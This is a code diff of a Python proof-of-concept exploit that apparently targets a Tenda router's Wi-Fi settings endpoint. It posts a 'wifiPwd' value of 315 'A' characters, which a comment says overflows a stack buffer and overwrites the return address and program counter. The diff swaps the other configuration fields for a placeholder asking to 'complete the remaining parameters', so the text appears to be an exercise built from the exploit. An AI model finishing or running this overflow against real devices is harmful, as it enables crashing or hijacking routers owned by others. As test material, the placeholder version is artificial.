@@ -115,43 +115,9 @@ headers = {
 }
 
 data = {
-    'module1': 'wifiBasicCfg',
-    'doubleBandUnityEnable': 'false',
-    'wifiTotalEn': 'true',
-    'wifiEn': 'true',
-    'wifiSSID': 'tenda',
-    'wifiSecurityMode': 'WPAWPA2/AES',
+      # Complete the remaining required configuration parameters.
     'wifiPwd': 'A' * 315,  # 315 bytes — overflows stack buffer, smashes RA and PC
-    'wifiHideSSID': 'false',
-    'wifiEn_5G': 'true',
-    'wifiSSID_5G': 'tenda_5G',
-    'wifiSecurityMode_5G': 'WPAWPA2/AES',
-    'wifiPwd_5G': 'changeme',
-    'wifiHideSSID_5G': 'false',
-    'module2': 'wifiGuest',
-    'guestEn': 'false',
-    'guestEn_5G': 'false',
-    'guestSSID': 'Tenda_VIP',
-    'guestSSID_5G': 'Tenda_VIP_5G',
-    'guestPwd': '',
-    'guestPwd_5G': '',
-    'guestValidTime': '8',
-    'guestShareSpeed': '0',
-    'module3': 'wifiPower',
-    'wifiPower': 'high',
-    'wifiPower_5G': 'high',
-    'module5': 'wifiAdvCfg',
-    'wifiMode': 'bgn',
-    'wifiChannel': 'auto',
-    'wifiBandwidth': 'auto',
-    'wifiMode_5G': 'ac',
-    'wifiChannel_5G': 'auto',
-    'wifiBandwidth_5G': 'auto',
-    'wifiAntijamEn': 'false',
-    'module6': 'wifiBeamforming',
-    'wifiBeaformingEn': 'true',
-    'module7': 'wifiWPS',
-    'wpsEn': 'true',
+      .........
 }
 
 response = requests.post(
